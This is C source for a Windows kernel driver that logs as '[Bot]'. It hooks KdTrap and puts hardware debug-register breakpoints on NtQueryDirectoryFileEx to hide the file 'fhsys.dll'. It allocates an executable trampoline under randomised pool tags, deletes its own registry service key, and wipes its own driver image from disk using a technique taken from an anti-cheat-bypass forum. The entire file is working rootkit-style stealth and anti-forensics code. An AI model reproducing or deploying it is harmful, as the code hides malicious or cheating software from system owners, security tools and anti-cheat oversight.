#include <ntifs.h>
#include <ntddk.h>
#include <intrin.h>

#include "stdint.h"
#include "Hook-KdTrap/HookKdTrap.h"
#include "hde/hde64.h"
#include "handler.h"
#include "util.h"

__declspec(noinline) BOOLEAN fun(int n, int m) {
	int r;
	r = n * m;
	++r;
	return r >= 65;
}

ULONG_PTR setupDr(ULONG_PTR arg) {
	uint64_t dr7;

	__writedr(0, arg);
	dr7 = __readdr(7);
	dr7 |= 0x1 << 1;
	dr7 &= ~(0xf << 16);
	__writedr(7, dr7);

	return 0;
}

extern uint32_t drHit;
extern UNICODE_STRING hiddenFile;

NtQueryDirectoryFileEx_t origNtQueryDirectoryFileEx;

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	HANDLE han;
	OBJECT_ATTRIBUTES oa;
	IO_STATUS_BLOCK io;
	NTSTATUS status;
	UNICODE_STRING us;
	PFILE_OBJECT ob;
	PSECTION_OBJECT_POINTERS secObPtr;

	rand_state_t state;
	hde64s hs;
	const uint8_t absJmp[] = {0xFF, 0x25, 0x00, 0x00, 0x00, 0x00};
	uint8_t *tramp, queryDirInst;

	RtlInitUnicodeString(&hiddenFile, L"fhsys.dll");

	rand_init(&state);

	HookKdTrap(handler);

	queryDirInst = hde64_disasm(NtQueryDirectoryFileEx, &hs);
	tramp = ExAllocatePoolWithTag(NonPagedPoolExecute, queryDirInst + sizeof(absJmp) * 1 + 8 * 1, rand_tag(&state));

	origNtQueryDirectoryFileEx = tramp;
	memcpy(tramp, NtQueryDirectoryFileEx, queryDirInst);
	tramp += queryDirInst;
	memcpy(tramp, absJmp, sizeof(absJmp));
	tramp += sizeof(absJmp);
	*((uint64_t*)tramp) = (uint64_t)((uint8_t*)NtQueryDirectoryFileEx + queryDirInst);
	tramp += 8;
	

	KeIpiGenericCall(setupDr, (uint64_t)NtQueryDirectoryFileEx);
	//__debugbreak();

	DbgPrintEx(0, 0, "[Bot] %wZ\n", *RegistryPath);

	InitializeObjectAttributes(&oa, RegistryPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	ZwOpenKey(&han, KEY_ALL_ACCESS, &oa);
	status = ZwDeleteKey(han);
	DbgPrintEx(0, 0, "[Bot] Delete key %x\n", status);
	ZwClose(han);

	//NOTE: loaderloader first run: icudtl.dat
	//NOTE: loaderloader installed: fhsys.dll

	IoQueryFullDriverPath(DriverObject, &us);
	DbgPrintEx(0, 0, "[Bot] %wZ\n", us);

	//https://www.unknowncheats.me/forum/anti-cheat-bypass/263872-driver-destroy.html
	InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	status = IoCreateFileEx(&han, SYNCHRONIZE | DELETE, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING, NULL);
	DbgPrintEx(0, 0, "[Bot] CreateFileEx %x\n", status);

	status = ObReferenceObjectByHandleWithTag(han, SYNCHRONIZE | DELETE, *IoFileObjectType, KernelMode, rand_tag(&state), &ob, NULL);
	DbgPrintEx(0, 0, "[Bot] ReferenceObject %x\n", status);

	secObPtr = ob->SectionObjectPointer;
	secObPtr->ImageSectionObject = NULL;

	MmFlushImageSection(secObPtr, MmFlushForDelete);
	ObfDereferenceObject(ob);
	ObCloseHandle(han, KernelMode);

	status = ZwDeleteFile(&oa);
	DbgPrintEx(0, 0, "[Bot] Delete file %x\n", status);

	ExFreePool(us.Buffer);

	DbgPrintEx(0, 0, "[Bot] %p %p\n", __readdr(0), __readdr(7));
	DbgPrintEx(0, 0, "[Bot] %u\n", fun(4, 5));
	DbgPrintEx(0, 0, "[Bot] Hit %u\n", drHit);
	DbgPrintEx(0, 0, "[Bot] LOADED\n");
	return STATUS_SUCCESS;
}